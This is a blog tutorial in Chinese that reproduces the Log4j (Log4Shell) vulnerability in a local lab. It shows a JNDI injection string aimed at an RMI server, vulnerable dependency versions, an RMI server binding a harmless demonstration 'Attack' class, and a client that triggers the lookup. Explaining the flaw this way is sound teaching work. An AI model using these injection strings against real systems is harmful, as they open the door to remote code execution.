@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.118.2">
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="https://hanchao666.top/posts/log4j-attack/" />
+  <link rel="canonical" href="https://hanchao666.top/posts/log4j-attack/" /><link rel="apple-touch-icon" href="/logo.png" />
+  <link rel="icon" href="/logo.png" />
+  <link rel="shortcut" href="/logo.png" /><link rel="alternate" type="application/atom+xml" href="https://hanchao666.top/index.xml" title="Hadoo&#39;s Blog">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "https:\/\/hanchao666.top\/"
+      },
+      "articleSection" : "posts",
+      "name" : "Log4j漏洞攻击原理",
+      "headline" : "Log4j漏洞攻击原理",
+      "description" : "在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。\n1.触发形式 就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？\n当我们正常进行日志的打印时，是没有问题的，例如：\npublic void login(string name){ String name = \u0026#34;test\u0026#34;; \/\/表单接收name字段 logger.info(\u0026#34;{},登录了\u0026#34;, name); \/\/logger为log4j } 但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：\npublic void login(string name){ String name = \u0026#34;{$java:os}\u0026#34;; \/\/用户输入的name内容为 {$java:os} logger.info(\u0026#34;{},登录了\u0026#34;, name); \/\/logger为log4j } 那么打印出的结果就是 Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了\n如果要是输入以下形式的通配符：\npublic void login(string name){ String name = \u0026#34;${jndi:rmi:192.168.9.23:1099\/remote}\u0026#34;; \/\/用户输入的name内容为 jndi相关信息 logger.info(\u0026#34;{},登录了\u0026#34;, name); } 那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。\n下面逆流而上，复现一个这个攻击过程~\n导入相关依赖 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;\/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;\/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;\/version\u0026gt; \u0026lt;\/dependency\u0026gt; \u0026lt;\/dependencies\u0026gt; log4j.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2021",
+      "datePublished": "2021-12-25 17:48:25 \u002b0800 CST",
+      "dateModified" : "2021-12-25 17:48:25 \u002b0800 CST",
+      "url" : "https:\/\/hanchao666.top\/posts\/log4j-attack\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>Log4j漏洞攻击原理</title>
+  <meta property="og:title" content="Log4j漏洞攻击原理" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。
+1.触发形式 就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？
+当我们正常进行日志的打印时，是没有问题的，例如：
+public void login(string name){ String name = &amp;#34;test&amp;#34;; //表单接收name字段 logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：
+public void login(string name){ String name = &amp;#34;{$java:os}&amp;#34;; //用户输入的name内容为 {$java:os} logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 那么打印出的结果就是 Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了
+如果要是输入以下形式的通配符：
+public void login(string name){ String name = &amp;#34;${jndi:rmi:192.168.9.23:1099/remote}&amp;#34;; //用户输入的name内容为 jndi相关信息 logger.info(&amp;#34;{},登录了&amp;#34;, name); } 那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。
+下面逆流而上，复现一个这个攻击过程~
+导入相关依赖 &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; log4j." />
+  <meta name="description" content="在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。
+1.触发形式 就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？
+当我们正常进行日志的打印时，是没有问题的，例如：
+public void login(string name){ String name = &amp;#34;test&amp;#34;; //表单接收name字段 logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：
+public void login(string name){ String name = &amp;#34;{$java:os}&amp;#34;; //用户输入的name内容为 {$java:os} logger.info(&amp;#34;{},登录了&amp;#34;, name); //logger为log4j } 那么打印出的结果就是 Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了
+如果要是输入以下形式的通配符：
+public void login(string name){ String name = &amp;#34;${jndi:rmi:192.168.9.23:1099/remote}&amp;#34;; //用户输入的name内容为 jndi相关信息 logger.info(&amp;#34;{},登录了&amp;#34;, name); } 那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。
+下面逆流而上，复现一个这个攻击过程~
+导入相关依赖 &amp;lt;dependencies&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;dependency&amp;gt; &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt; &amp;lt;/dependency&amp;gt; &amp;lt;/dependencies&amp;gt; log4j." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="/logo.png" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:800px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px;background-color:#f6f8fa}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="Hadoo&#39;s Blog">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-53624533-8"></script><script src="https://cdn.jsdelivr.net/gh/joway/homepage/analytics.js"></script>
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >Hadoo&#39;s Blog</a
+    >
+  </div>
+  <div class="header-subtitle">大道至简，知行合一</div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="https://github.com/yeshadoo" target="_blank">About Me</a>
+  </div>
+  
+  <div class="header-item">
+    <a href="https://github.com/yeshadoo" target="_blank">Github</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+  <div class="lang-switch col-xs-3 col-xs-offset-9">
+    <a href="/cn/">Chinese</a>
+  </div>
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">Log4j漏洞攻击原理</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2021-12-25 17:48:25 CST">
+                25 Dec 2021
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <p>在轰动互联网的log4j漏洞之后，复现总结一下该漏洞原理。</p>
+<h4 id="1触发形式">1.触发形式</h4>
+<p>就是打印个日志，怎么就有安全漏洞了？我们需要跳出常规化思考，如果计算机世界所有情况都是正常的，我们写代码也就不要那么多的try catch了。触发漏洞的入口，就在于log4j中的lookup方法，lookup方法在log4j中是如何使用的呢？</p>
+<p>当我们正常进行日志的打印时，是没有问题的，例如：</p>
+<pre tabindex="0"><code>public void login(string name){
+  String name = &#34;test&#34;;  //表单接收name字段
+  logger.info(&#34;{},登录了&#34;, name); //logger为log4j
+}
+</code></pre><p>但是logger.info中的{}是支持通配符的模式的，如果使用下面的代码片段：</p>
+<pre tabindex="0"><code>public void login(string name){
+  String name = &#34;{$java:os}&#34;;  //用户输入的name内容为  {$java:os}
+  logger.info(&#34;{},登录了&#34;, name); //logger为log4j
+}
+</code></pre><p>那么打印出的结果就是 <code>Windows 7 6.1 Service Pack 1, architecture: amd64-64，登录了</code></p>
+<p>如果要是输入以下形式的通配符：</p>
+<pre tabindex="0"><code>public void login(string name){
+  String name = &#34;${jndi:rmi:192.168.9.23:1099/remote}&#34;;  //用户输入的name内容为 jndi相关信息
+  logger.info(&#34;{},登录了&#34;, name); 
+}
+</code></pre><p>那么lookup方法就会通过RMI进行远程方法调用，如果黑客在远端服务部署攻击脚本，GG。</p>
+<p>下面逆流而上，复现一个这个攻击过程~</p>
+<ol>
+<li>导入相关依赖</li>
+</ol>
+<pre tabindex="0"><code>    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
+            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
+            &lt;version&gt;2.14.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre><ol start="2">
+<li>log4j.xml配置</li>
+</ol>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;Configuration status=&#34;WARN&#34;&gt;
+    &lt;Appenders&gt;
+        &lt;Console name=&#34;Console&#34; target=&#34;SYSTEM_OUT&#34;&gt;
+            &lt;ThresholdFilter level=&#34;info&#34; onMatch=&#34;ACCEPT&#34; onMismatch=&#34;ACCEPT&#34;/&gt;
+            &lt;PatternLayout pattern=&#34;%d{yyyy-MM-dd HH:mm:ss.sss} %-5level %L %M - %msg%xEx%n&#34;/&gt;
+        &lt;/Console&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;logger name=&#34;com.example&#34; lecel=&#34;info&#34;/&gt;
+        &lt;root level=&#34;info&#34;&gt;
+            &lt;AppenderRef ref=&#34;Console&#34;/&gt;
+        &lt;/root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre><ol start="3">
+<li>攻击代码准备</li>
+</ol>
+<p>Attack.java</p>
+<pre tabindex="0"><code>public class Attack implements ObjectFactory {
+    public Attack() {
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context context, Hashtable hashtable) throws Exception {
+        System.out.println(&#34;I am coming...&#34;);
+
+        String attckMessage = &#34;哒哒哒 你已经被攻击了~~~~&#34;;
+        System.out.println(attckMessage);
+
+        return attckMessage;
+    }
+}
+</code></pre><p>RMIServer.java</p>
+<pre tabindex="0"><code>public class RMIServer {
+    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
+        Registry registry = LocateRegistry.createRegistry(1099);
+        System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
+        Reference reference = new Reference(&#34;demo.Attack&#34;,&#34;demo.Attack&#34;,null);
+        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
+        registry.bind(&#34;obj&#34;,wrapper);
+        System.out.println(&#34;server is running&#34;);
+    }
+}
+</code></pre><p>RMIClient.java</p>
+<pre tabindex="0"><code>    private static final Logger logger = LogManager.getLogger();
+
+    public static void main(String[] args) {
+        System.setProperty(&#34;com.sun.jndi.rmi.object.trustURLCodebase&#34;, &#34;true&#34;);
+        String name = &#34;${jndi:rmi://127.0.0.1:1099/obj}&#34;;
+        logger.error(&#34;{} 客户端已上钩&#34;, name);
+
+    }
+</code></pre><p>先启动服务端兼容1099端口，并注册服务；然后启动客户端进行日志打印，运行结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/yeshadoo/blog-images/master/img/image-20230912175002355.png" alt="image-20230912175002355"></p>
